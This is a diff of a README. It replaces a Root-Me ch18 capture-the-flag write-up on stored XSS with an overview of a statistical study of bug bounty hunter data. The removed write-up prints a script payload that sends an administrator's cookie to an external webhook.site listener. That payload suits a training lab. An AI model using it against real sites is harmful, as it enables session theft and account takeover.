@@ -1,47 +1,18 @@
-# Root-Me Web-Client ch18 — Stored XSS: Admin Cookie Exfiltration
+# Bug Bounty Hunter Analysis
 
-## Overview
+This is a research-notes space documenting a statistical analysis of bug bounty hunter data (reports, points, CWE categories, entropy of specialization).
 
-The target is a minimal forum ("Forum v0.001") that accepts a title and a message and displays posted messages back on the page. This write-up documents the discovery and exploitation of a **stored cross-site scripting (XSS)** vulnerability that allowed exfiltration of an administrator's session cookie.
+## Structure
 
-## Environment
+* **Documentation** — write-ups of each analysis stage, meant to be read in this order:
+  1. Data Preprocessing — cleaning hacktivity data, reconciling legacy OWASP labels with canonical CWE/bug\_name categories, deciding how to count a "report" (uses report status `new` as the estimator, since resolution status is inconsistent).
+  2. Statistical Inference — EDA on points/reports/join-date/country distributions, and a sanity check comparing hunter-reported stats totals vs. hacktivity-derived totals (large discrepancies for some hunters, exact matches for others).
+  3. Shannon Entropy Analysis — Shannon entropy analysis of each hunter's specialization across CWE categories, correlated (Spearman) against leaderboard rank.
+  4. Reports to Points — Spearman correlation between reports, points, and rank.
+* **Source Scripts** — the Python scripts used throughout the analysis, with descriptions and full source, viewable as dropdowns.
+* **Write-ups** — standalone technical write-ups, such as the Root-Me Web-Client ch18 stored XSS exploitation.
 
-* Kali Linux on Oracle VirtualBox
-* Burp Suite (intercepting proxy)
-* Target: `http://challenge01.root-me.org/web-client/ch18/`
+## Working notes
 
-## Discovery
-
-The application's structure — a post-and-display forum — closely resembled the DVWA stored-XSS exercise, so stored XSS was an early hypothesis.
-
-```html
-<script>alert("Hello World")</script>
-```
-
-<figure><img src=".gitbook/assets/cookie_3.png" alt=""><figcaption><p>Document.cookie </p></figcaption></figure>
-
-The alert fired when the post rendered, confirming the application **stores and returns input without output encoding**, and that injected scripts execute.
-
-## Establishing the attack goal
-
-With execution confirmed, I tested whether cookie theft was viable by injecting `document.cookie`. It returned blank — my own unauthenticated session had no JS-readable cookie. That reframed the problem: the cookie worth stealing belongs to whoever's browser _executes_ the script, not mine. I still needed to find how a privileged user would ever trigger the payload.
-
-## Ruling out an alternative path
-
-The page displayed a `Status: visitor` label, so I checked in Burp whether privilege was tracked in a client-controllable value. Only `titre` and `message` were sent to the server — no status parameter — indicating the label is server-rendered and not forgeable. This ruled out a privilege-escalation route and confirmed XSS-based exfiltration as the necessary approach.
-
-I also inspected the server's response headers and found **no `Content-Security-Policy`** — meaning inline scripts and outbound requests to external origins are unrestricted, a precondition for exfiltration to succeed.
-
-## Finding the victim
-
-Reviewing the page source, one system-generated post stood out: _"Message read / Your messages have been read."_ A passive forum wouldn't announce that messages had been read — so an automated process (inferred to be an admin) periodically renders the stored posts. That process is the victim context: when it renders my post, my script runs in _its_ browser.
-
-## Exploitation
-
-I stood up a listener on webhook.site and crafted a payload that, on execution, reads the current cookie and sends it out-of-band as a query parameter:
-
-```html
-<script>new Image().src='https://webhook.site/<id>/?c='+encodeURIComponent(document.cookie)</script>
-```
-
-The image beacon fires a GET the moment its `src` is set, without navigating the page or requiring CORS (the response is never read), and the cookie is URL-encoded to preserve its delimiters. After a few minutes — the admin process's next sweep — the listener received a request carrying the administrator's cookie:
+* Statistical results (Spearman's ρ, p-values, N) quoted throughout come from specific analysis runs.
+* Treat the documentation pages as lab-notebook-style writing: each records a research question, method, and result, often with open questions at the end.
